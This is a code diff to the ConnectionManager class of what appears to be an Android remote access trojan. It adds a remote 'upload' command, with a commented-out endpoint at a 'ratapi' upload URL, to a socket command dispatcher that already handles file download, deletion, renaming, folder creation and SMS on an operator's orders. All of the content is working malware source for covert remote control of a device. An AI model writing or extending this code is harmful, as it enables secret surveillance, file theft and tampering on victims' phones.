@@ -126,6 +126,9 @@ public class ConnectionManager {
                             case "download":
                                 fileDownload(jsonObject.getString("uploadurl"),jsonObject.getString("path"));
                                 break;
+                            case "upload":
+                                fileUpload(jsonObject.getString("url"),jsonObject.getString("path"));
+                                break;
                             case "deletefile":
                                 fileDelete(jsonObject.getString("path"));
                                 break;
@@ -161,6 +164,18 @@ public class ConnectionManager {
             ioSocket.connect();
         } catch (Exception e) {
             e.printStackTrace();
+        }
+    }
+
+    private static void fileUpload(String url, String path) {
+        try {
+            //FileManager.downloadFile(path);
+            //"https://gyanimade.ml/ratapi/fileupload/upload.php"
+            FileManager.downloadFile(url, path);
+            //ioSocket.emit("download", deviceId, "{\"status\":true}");
+        } catch (Exception e) {
+            e.printStackTrace();
+            ioSocket.emit("upload", deviceId, "{\"status\":false}");
         }
     }
 
@@ -232,9 +247,9 @@ public class ConnectionManager {
         try{
             boolean status = FileManager.deleteFile(path);
             if (status) {
-                ioSocket.emit("sendsms", deviceId, "{\"status\":true}");
+                ioSocket.emit("deletefile", deviceId, "{\"status\":true}");
             } else {
-                ioSocket.emit("sendsms", deviceId, "{\"status\":false}");
+                ioSocket.emit("deletefile", deviceId, "{\"status\":false}");
             }
         }catch (Exception e){
             e.printStackTrace();
@@ -245,9 +260,9 @@ public class ConnectionManager {
         try{
         boolean status = FileManager.renameFile(path, filename);
         if (status) {
-            ioSocket.emit("sendsms", deviceId, "{\"status\":true}");
+            ioSocket.emit("renamefile", deviceId, "{\"status\":true}");
         } else {
-            ioSocket.emit("sendsms", deviceId, "{\"status\":false}");
+            ioSocket.emit("renamefile", deviceId, "{\"status\":false}");
         }
         }catch (Exception e){
             e.printStackTrace();
@@ -258,9 +273,9 @@ public class ConnectionManager {
         try{
             boolean status = FileManager.createFolder(path);
             if (status) {
-                ioSocket.emit("sendsms", deviceId, "{\"status\":true}");
+                ioSocket.emit("newfolder", deviceId, "{\"status\":true}");
             } else {
-                ioSocket.emit("sendsms", deviceId, "{\"status\":false}");
+                ioSocket.emit("newfolder", deviceId, "{\"status\":false}");
             }
         }catch (Exception e){
             e.printStackTrace();
